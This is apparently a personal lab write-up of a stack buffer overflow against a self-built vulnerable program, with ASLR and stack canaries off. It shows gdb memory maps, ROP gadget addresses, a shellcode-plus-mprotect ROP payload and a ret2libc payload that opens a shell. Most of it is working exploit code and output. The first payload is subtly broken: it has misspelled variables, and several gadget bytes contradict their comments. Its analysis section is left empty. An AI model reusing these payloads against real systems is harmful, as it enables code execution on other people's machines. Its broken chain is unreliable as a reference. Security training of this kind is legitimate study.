# &#35; basic stack buffer overflow

#### &#42; setting aslr off & core dump
```bash

$ cat /etc/sysctl.conf
kernel.randomize_va_space=0
kernel.core_pattern = core.%e


$ sudo sysctl -p
kernel.randomize_va_space = 0
kernel.core_pattern = core.%e

```

#### &#42; vulnerable source code
#### gets() in vuln_func() : can overwrite rsp & rip ...
```bash

$ cat vulnerable.c
#include <stdio.h>

void vuln_func() {
	char buffer[256];
	gets(&buffer);
	printf("%s\n", buffer);
}

void main(int argc, char *argv[]) {
	vuln_func();
}

# Canary/SSP off because of first exploit
$ gcc -fno-stack-protector vulnerable.c -o vulnerable
```

#### &#42; how to give execute permition on stack using mprotect()
```bash
$ gdb ./vulnerable -q
gef➤  b main
Breakpoint 1 at 0x55555555519e
gef➤  r
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/user/aslr/nx-gets-mprotect/vulnerable
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/user/aslr/nx-gets-mprotect/vulnerable
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/user/aslr/nx-gets-mprotect/vulnerable
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/user/aslr/nx-gets-mprotect/vulnerable
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/user/aslr/nx-gets-mprotect/vulnerable
0x00007ffff7dbf000 0x00007ffff7de4000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7de4000 0x00007ffff7f5c000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7f5c000 0x00007ffff7fa6000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa6000 0x00007ffff7fa7000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa7000 0x00007ffff7faa000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7faa000 0x00007ffff7fad000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fad000 0x00007ffff7fb3000 0x0000000000000000 rw-
0x00007ffff7fc9000 0x00007ffff7fcd000 0x0000000000000000 r-- [vvar]
0x00007ffff7fcd000 0x00007ffff7fcf000 0x0000000000000000 r-x [vdso]
0x00007ffff7fcf000 0x00007ffff7fd0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7fd0000 0x00007ffff7ff3000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ff3000 0x00007ffff7ffb000 0x0000000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002d000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
gef➤

## stack hasn't execute(x) permission.
## now we can give execute permisstion on stack using mprotect().
## int mprotect (void *addr, size_t len, int prot);
## int mprotect (&stack, 0x01010101, 7);
## struct
# pop rdi ; ret
# shellcode & nops address in stack
# pop rsi ; ret
# large size (0x01010101)
# pop rdx ; ret
# 0x07 => rwx
# &mprotect

```

#### &#42; find gadgets and mprotect() address
```bash
$ gdb ./vulnerable -q
gef➤  b *main
Breakpoint 1 at 0x119e
gef➤  r
.
.
gef➤  vmmap
0x00007ffff7dbf000 0x00007ffff7de4000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7de4000 0x00007ffff7f5c000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7f5c000 0x00007ffff7fa6000 0x000000000019d000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa6000 0x00007ffff7fa7000 0x00000000001e7000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa7000 0x00007ffff7faa000 0x00000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7faa000 0x00007ffff7fad000 0x00000000001ea000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
.
.
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]

## stack(rw- [stack]) hasn't execute permission.

# mprotect() address
gef➤  p mprotect
$2 = {<text variable, no debug info>} 0x7ffff7edab00 <mprotect>
gef➤

## gadgets address
## (pop rdx ; ret) not exists
## thus (pop rdx ; pop rbx ; ret) use.
$ ROPgadget --binary ./libc.so.6 --depth 3 > gadgets.txt
libc_base = 0x00007ffff7dbf000
0x0000000000026b72 : pop rdi ; ret
0x0000000000027529 : pop rsi ; ret
0x0000000000162866 : pop rdx ; pop rbx ; ret

## then we changed struct like below
# pop rdi ; ret
# shellcode & nops address in stack
# pop rsi ; ret
# large size (0x01010101)
# pop rdx ; pop rbx ; ret
# 0x07 => rwx (rdx)
# 0x07 => rbx
# &mprotect
# &shellcode

```


#### &#42; assemble rtl(return to libc) mprotect()
```bash
## payload struct
nops[177]
shellcode[23]
nops[56]
rbp[8]
# pop rdi ; ret [8]
# shellcode & nops address in stack
# pop rsi ; ret [8]
# large size (0x010101010101)
# pop rdx ; pop rbx ; ret [8]
# 0x07 => rwx (rdx) [8]
# 0x07 => rbx [8]
# &mprotect [8]
# &shellcode[8]

$ cat exp.py
shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
payload  = "\x90"*177
payload += shellocde
payload += "\x90"*56
payload += "B"*8
payload += "\x72\x5b\xde\xf7\xff\x7f\x00\x00"  # 0x7ffff7de5b72 : pop rdi ; ret
payload += "\x00\xde\xfd\xff\xff\x7f\x00\x00"  # 0x00007ffffffde000 stack
payload += "\xaa\x65\xf7\xf7\xff\x7f\x00\x00"  # 0x7ffff7de6529 : pop rsi ; ret
payload += "\x01\x01\x01\x01\x01\x01\x00\x00"  # large size
payload += "\x10\x44\xe1\xf7\xff\x7f\x00\x00"  # 0x7ffff7f21866 : pop rdx ; pop rbx ; ret
payload += "\x07\x00\x00\x00\x00\x00\x00\x00"  # 0x07
payload += "\x07\x00\x00\x00\x00\x00\x00\x00"  # 0x07
payload += "\xc0\x8b\xe0\xf7\xff\x7f\x00\x00"  # 0x7ffff7edab00 mprotect()
paylaod += "\x41"*6

print(payload)

```

#### &#42; try to exploit
```bash
$ (cat payload ; cat) | ./vulnerable
���������������������������������������������������������������������������������������������������������������������������������������������������������������������������������H1�VH�/bin//shWT_j;X���������������������������������������������������������BBBBBBBBr[���

segmentation fault (core dumped)

```


#### &#42; analysis using gdb(gef)
```bash
## find out using gdb

$ gdb ./vulnerable -q
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded for GDB 9.2 using Python engine 3.8
[*] 3 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./vulnerable...
(No debugging symbols found in ./vulnerable)
gef➤  b *vuln_func
Breakpoint 1 at 0x1169
gef➤  r < payload


```



#### &#42; About stack alignment.
#### link : <http://blog.binpang.me/2019/07/12/stack-alignment/>
```bash
## we need to modify out rtl payload to 16 bytes alignment.
## payload struct
padding[256]
rbp[8]
ret[8]
pop rdi ; ret[8]
/bin/sh[8]
system()[8]

$ cat exp.py
payload  = "A"*256
payload += "B"*8
payload += "\x73\x5b\xde\xf7\xff\x7f\x00\x00"  #0x7ffff7de5b73 : ret
payload += "\x72\x5b\xde\xf7\xff\x7f\x00\x00"  #0x7ffff7de5b72 : pop rdi ; ret
payload += "\xaa\x65\xf7\xf7\xff\x7f\x00\x00"  #0x7ffff7f765aa /bin/sh
payload += "\x10\x44\xe1\xf7\xff\x7f\x00\x00"  #0x7ffff7e14410 system()
payload += "\xc0\x8b\xe0\xf7\xff\x7f\x00\x00"  # 0x7ffff7e08bc0 exit()

print(payload)

```


#### &#42; try to exploit again
user@pwn:~/aslr/nx-gets$ python exp.py > payload
user@pwn:~/aslr/nx-gets$ (cat payload ; cat) | ./vulnerable
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBs[���

id
uid=1000(user) gid=1000(user) groups=1000(user)

```

